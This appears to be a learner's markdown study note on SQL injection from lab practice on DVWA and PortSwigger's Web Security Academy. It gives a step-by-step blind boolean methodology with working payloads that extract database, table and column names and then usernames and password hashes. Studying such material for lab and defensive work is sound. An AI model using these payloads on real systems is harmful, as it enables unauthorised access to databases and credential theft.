# SQL Injection

## What is it
Injecting malicious SQL code into queries to manipulate
the database — extracting, modifying, or deleting data.

## Types

| Type | Description |
|---|---|
| Classic/Union based | Output visible in response |
| Blind boolean based | True/false responses only |
| Blind time based | Infer via response delays |
| Out of band | Data via DNS/HTTP (theory) |

## Methodology

### Step 1 — Confirm vulnerability
```sql
1' OR 1=1--+    → User ID exists  = vulnerable
1' OR 1=2--+    → User ID missing = confirmed
```

### Step 2 — Find number of columns
```sql
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
-- Error appears = that's the column count
```

### Step 3 — Extract database name
```sql
-- Find length
1' AND LENGTH(database())=4--+

-- Extract character by character
1' AND ASCII(SUBSTRING(database(),1,1))=100--+
```

### Step 4 — Extract table names
```sql
-- Count tables
1' AND (SELECT COUNT(table_name) FROM
information_schema.tables WHERE
table_schema=database())=2--+

-- Extract first table name
1' AND ASCII(SUBSTRING((SELECT table_name FROM
information_schema.tables WHERE
table_schema=database() LIMIT 0,1),1,1))=97--+
```

### Step 5 — Extract column names
```sql
-- Count columns
1' AND (SELECT COUNT(column_name) FROM
information_schema.columns WHERE
table_name='users')=8--+

-- Extract first column name
1' AND ASCII(SUBSTRING((SELECT column_name FROM
information_schema.columns WHERE
table_name='users' LIMIT 0,1),1,1))=97--+
```

### Step 6 — Extract data
```sql
-- Extract username
1' AND ASCII(SUBSTRING((SELECT user FROM
users LIMIT 0,1),1,1))=97--+

-- Extract password
1' AND ASCII(SUBSTRING((SELECT password FROM
users LIMIT 0,1),1,1))=97--+
```

## Key learnings
- Always find column count before UNION
- Use ASCII() to avoid quote encoding issues
- Binary search ASCII values for speed
- LIMIT 0,1 = first row, LIMIT 1,1 = second row
- Passwords in DVWA stored as MD5 hashes

## Platforms
- PortSwigger Web Security Academy ✅
